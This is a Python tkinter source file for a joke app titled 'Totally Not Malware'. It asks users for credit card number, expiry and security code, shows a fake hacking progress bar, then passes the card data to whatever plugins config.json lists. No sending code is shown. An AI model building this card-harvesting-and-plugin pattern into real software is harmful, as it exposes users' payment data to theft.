import tkinter as tk
import _tkinter
from tkinter import messagebox, ttk
from PIL import Image, ImageTk, ImageSequence
import os, sys, json, importlib, random

# Fichier de configuration pour les plugins
CONFIG_FILE = "config.json"
# Dossier où résident les plugins
PLUGINS_DIR = "plugins"

# Cache temporaire pour stocker les infos saisies
cache = {}

def load_config():
    """Charge la configuration des plugins."""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {"plugins": []}

def run_plugins():
    """Parcourt et exécute chaque plugin configuré."""
    config = load_config()
    plugin_names = config.get("plugins", [])
    for plugin_name in plugin_names:
        module_path = f"plugins.{plugin_name}"
        try:
            plugin_module = importlib.import_module(module_path)
            plugin_module.run_plugin(cache)
        except Exception as e:
            print(f"Erreur lors de l'exécution du plugin {plugin_name} : {e}")

# ----------------------------
# Animation du GIF
# ----------------------------
def animate_gif(frames, label, delay=100):
    def update(ind):
        label.config(image=frames[ind])
        ind = (ind + 1) % len(frames)
        root.after(delay, update, ind)
    update(0)

# ----------------------------
# Interface principale de saisie
# ----------------------------
def submit_info():
    # Récupérer les infos du formulaire et les stocker dans le cache
    cache["card"] = entry_card.get()
    cache["expiry"] = entry_expiry.get()
    cache["cvv"] = entry_cvv.get()
    
    # Transition vers un écran de traitement
    frame_entry.pack_forget()
    show_processing_frame()

# ----------------------------
# Écran de traitement (simulé)
# ----------------------------
def simulate_processing(progress=0):
    messages = [
        "H-hacking in progress...",
        "C-calculating cute factor...",
        "P-probing your secrets...",
        "Encrypting adorableness...",
        "Reticulating splines... (UwU)",
        "Almost done, nya~"
    ]
    progress_var.set(progress)
    msg_index = min(len(messages) - 1, progress // 20)
    proc_label.config(text=messages[msg_index])
    
    if progress < 100:
        next_progress = progress + random.randint(5, 15)
        if next_progress > 100: next_progress = 100
        root.after(300, simulate_processing, next_progress)
    else:
        # Une fois le traitement terminé, lance les plugins
        frame_processing.pack_forget()
        run_plugins()
        show_final_frame()

def show_processing_frame():
    frame_processing.pack(fill="both", expand=True)
    simulate_processing(0)

# ----------------------------
# Écran final interactif
# ----------------------------
def show_final_frame():
    frame_final.pack(fill="both", expand=True)
    dialogues = [
        "UwU, th-thanks for your info...",
        "Y-y-your data is now securely backed up in the interwebs!",
        "H-hum, it's so cute how you shared it, nya~",
        "Calculating your ultimate cute factor...",
        "All done! Stay adorable!"
    ]
    def display_dialogues(i=0):
        if i < len(dialogues):
            final_msg_label.config(text=dialogues[i])
            root.after(1500, display_dialogues, i + 1)
        else:
            restart_button.pack(pady=10)
            exit_button.pack(pady=10)
    display_dialogues()

def restart_app():
    cache.clear()
    entry_card.delete(0, tk.END)
    entry_expiry.delete(0, tk.END)
    entry_cvv.delete(0, tk.END)
    frame_final.pack_forget()
    restart_button.pack_forget()
    exit_button.pack_forget()
    frame_entry.pack(fill="both", expand=True)

# ----------------------------
# Configuration de la fenêtre principale
# ----------------------------
root = tk.Tk()
root.title("Totally Not Malware")
root.geometry("430x230")
root.resizable(False, False)
root.configure(bg="#f0f0ff")

# --- Chargement et animation du GIF à partir d'un fichier local ---
# Pour supporter le mode one-file, on recherche dans sys._MEIPASS si disponible
if hasattr(sys, '_MEIPASS'):
    base_path = sys._MEIPASS
else:
    base_path = os.path.abspath(".")
gif_path = os.path.join(base_path, "src", "uwu.gif")
frames = []
try:
    if os.path.exists(gif_path):
        gif = Image.open(gif_path)
        for frame in ImageSequence.Iterator(gif):
            frame = frame.convert("RGBA").resize((100, 100), Image.LANCZOS)
            frames.append(ImageTk.PhotoImage(frame))
    else:
        print("Le fichier GIF n'a pas été trouvé :", gif_path)
except Exception as e:
    print("Erreur lors de l'ouverture ou du traitement du GIF :", e)

# ----------------------------
# Écran d'entrée (formulaire)
# ----------------------------
frame_entry = tk.Frame(root, bg="#f0f0ff")
frame_entry.pack(fill="both", expand=True)

left_frame = tk.Frame(frame_entry, width=110, height=200, bg="#ffffff")
left_frame.pack(side="left", fill="y", padx=5, pady=5)
if frames:
    gif_label = tk.Label(left_frame, bg="#ffffff")
    gif_label.pack(expand=True)
    animate_gif(frames, gif_label, delay=100)
else:
    tk.Label(left_frame, text="(No Image)", bg="lightgray").pack(expand=True, fill="both")

right_frame = tk.Frame(frame_entry, bg="#f0f0ff")
right_frame.pack(side="right", fill="both", expand=True, padx=5, pady=5)
intro_label = tk.Label(right_frame, text="H-hi there...\nDo you th-think I could have your\ncredit card information, p-please?",
                        justify="left", font=("TkDefaultFont", 9), bg="#f0f0ff")
intro_label.pack(anchor="w", pady=(0, 5))

tk.Label(right_frame, text="Card number:", font=("TkDefaultFont", 8), bg="#f0f0ff").pack(anchor="w")
entry_card = tk.Entry(right_frame, width=25, font=("TkDefaultFont", 8))
entry_card.pack(anchor="w", pady=1)

tk.Label(right_frame, text="Expiry date:", font=("TkDefaultFont", 8), bg="#f0f0ff").pack(anchor="w")
entry_expiry = tk.Entry(right_frame, width=25, font=("TkDefaultFont", 8))
entry_expiry.pack(anchor="w", pady=1)

tk.Label(right_frame, text="Security code:", font=("TkDefaultFont", 8), bg="#f0f0ff").pack(anchor="w")
entry_cvv = tk.Entry(right_frame, width=25, font=("TkDefaultFont", 8))
entry_cvv.pack(anchor="w", pady=1)

submit_button = tk.Button(right_frame, text="Th-thanks", command=submit_info, font=("TkDefaultFont", 8))
submit_button.pack(anchor="e", pady=(5, 0))

# ----------------------------
# Écran de traitement
# ----------------------------
frame_processing = tk.Frame(root, bg="#f0f0ff")
proc_label = tk.Label(frame_processing, text="Initializing...", font=("TkDefaultFont", 10), bg="#f0f0ff")
proc_label.pack(pady=10)
progress_var = tk.IntVar()
progress_bar = ttk.Progressbar(frame_processing, orient="horizontal", length=300, mode="determinate", variable=progress_var)
progress_bar.pack(pady=5)

# ----------------------------
# Écran final
# ----------------------------
frame_final = tk.Frame(root, bg="#f0f0ff")
final_msg_label = tk.Label(frame_final, text="", font=("TkDefaultFont", 10), bg="#f0f0ff", justify="center")
final_msg_label.pack(pady=20)
restart_button = tk.Button(frame_final, text="Restart", command=restart_app, font=("TkDefaultFont", 8))
exit_button = tk.Button(frame_final, text="Exit", command=root.quit, font=("TkDefaultFont", 8))

root.mainloop()
